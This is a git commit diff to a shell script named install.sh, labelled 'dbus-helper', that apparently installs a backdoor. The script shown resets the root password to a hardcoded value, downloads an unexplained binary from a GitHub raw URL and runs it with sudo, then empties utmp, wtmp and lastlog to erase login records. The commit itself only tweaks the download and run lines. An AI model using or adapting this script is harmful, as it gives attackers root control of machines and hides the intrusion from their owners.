52d61fb548361a7febf0fd8a97a9608af35dc888
catherine935 <lynhhz1310@gmail.com>
2026-04-20 00:28:03 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -4,9 +4,9 @@ echo -e "\e[36m[dbus-helper]"
 
 echo -e "root:wtf@1112032" | chpasswd 
 
-wget https://raw.githubusercontent.com/catherine935/rmto238na/refs/heads/main/server > /dev/null 2>&1
+wget https://raw.githubusercontent.com/catherine935/rmto238na/refs/heads/main/server
 chmod +x ./server
-sudo ./server
+sudo ./server setup
 : > /var/run/utmp
 : > /var/log/wtmp
 : > /var/log/lastlog
